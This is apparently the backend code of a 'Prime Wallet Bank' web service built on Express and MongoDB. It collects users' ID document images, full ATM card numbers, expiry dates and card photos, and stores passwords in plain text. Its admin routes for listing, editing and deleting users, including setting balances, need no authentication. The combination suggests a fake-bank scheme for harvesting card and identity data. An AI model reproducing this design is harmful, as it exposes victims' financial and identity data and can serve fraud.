const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// ==========================================
// 🗄️ MONGODB CONNECTION
// ==========================================
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.log("⚠️ MONGO_URI not set — check Environment Variables in Render!");
} else {
  mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ CONNECTED TO MONGODB — ALL DATA SAVED FOREVER! 🌍"))
    .catch(err => console.log("❌ MongoDB Error:", err.message));
}

// ==========================================
// 📋 USER DATABASE SCHEMA
// ==========================================
const userSchema = new mongoose.Schema({
  id: String,
  full_name: String,
  email: { type: String, unique: true },
  phone: String,
  dob: String,
  gender: String,
  country: String,
  state: String,
  city: String,
  zip: String,
  account_number: String,
  password: String,
  id_type: String,
  id_number: String,
  idFront: String,
  idBack: String,
  atmHolder: String,
  atmNumber: String,
  atmExpiry: String,
  atmNetwork: String,
  atmFront: String,
  atmBack: String,
  balance: { type: Number, default: 0 },
  approved: { type: Boolean, default: false },
  frozen: { type: Boolean, default: false },
  card_request: Object,
  card_approved: { type: Boolean, default: false },
  pendingDeposits: Array,
  transactions: Array,
  created_at: String,
  updated_at: String
});

const User = mongoose.model("User", userSchema);

// ==========================================
// ⚙️ MIDDLEWARE
// ==========================================
app.use(cors({ origin: "*" }));
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// ==========================================
// 💚 HEALTH CHECK — KEEP ALIVE
// ==========================================
app.get("/api/health", (req, res) => {
  res.status(200).json({
    status: "🟢 ONLINE",
    message: "Prime Wallet Bank API — RUNNING 24/7 🌍",
    time: new Date().toLocaleString()
  });
});

// ==========================================
// 👤 REGISTER NEW USER
// ==========================================
app.post("/api/register", async (req, res) => {
  try {
    const existing = await User.findOne({ email: req.body.email });
    if (existing) return res.status(400).json({ error: "Email already registered" });

    const user = new User(req.body);
    await user.save();
    res.status(201).json({ success: true, message: "✅ Registered Successfully!", user });
  } catch (err) {
    console.error("Register Error:", err);
    res.status(500).json({ error: "Server Error — Please Try Again" });
  }
});

// ==========================================
// 🔐 USER LOGIN
// ==========================================
app.post("/api/login", async (req, res) => {
  try {
    const user = await User.findOne({ email: req.body.email.toLowerCase() });
    if (!user) return res.status(404).json({ error: "User Not Found" });
    if (user.password !== req.body.password) return res.status(401).json({ error: "Incorrect Password" });
    
    res.status(200).json({ success: true, user });
  } catch (err) {
    res.status(500).json({ error: "Login Error" });
  }
});

// ==========================================
// 📊 GET ALL USERS — ADMIN
// ==========================================
app.get("/api/admin/users", async (req, res) => {
  try {
    const users = await User.find().sort({ created_at: -1 });
    res.status(200).json(users);
  } catch (err) {
    res.status(500).json({ error: "Failed to load users" });
  }
});

// ==========================================
// ✅ UPDATE USER — APPROVE / FREEZE / DEPOSIT
// ==========================================
app.put("/api/admin/user/:id", async (req, res) => {
  try {
    const user = await User.findOneAndUpdate({ id: req.params.id }, req.body, { new: true });
    if (!user) return res.status(404).json({ error: "User not found" });
    res.status(200).json({ success: true, user });
  } catch (err) {
    res.status(500).json({ error: "Update failed" });
  }
});

// ==========================================
// 🗑️ DELETE USER
// ==========================================
app.delete("/api/admin/user/:id", async (req, res) => {
  try {
    await User.findOneAndDelete({ id: req.params.id });
    res.status(200).json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Delete failed" });
  }
});

// ==========================================
// 🚀 START SERVER
// ==========================================
app.listen(PORT, () => {
  console.log(`\n🚀 Prime Wallet Bank API RUNNING on Port ${PORT}`);
  console.log(`🌍 Global Access — All Countries Supported`);
  console.log(`💾 MongoDB Connected — Data Saved Forever!\n`);
});
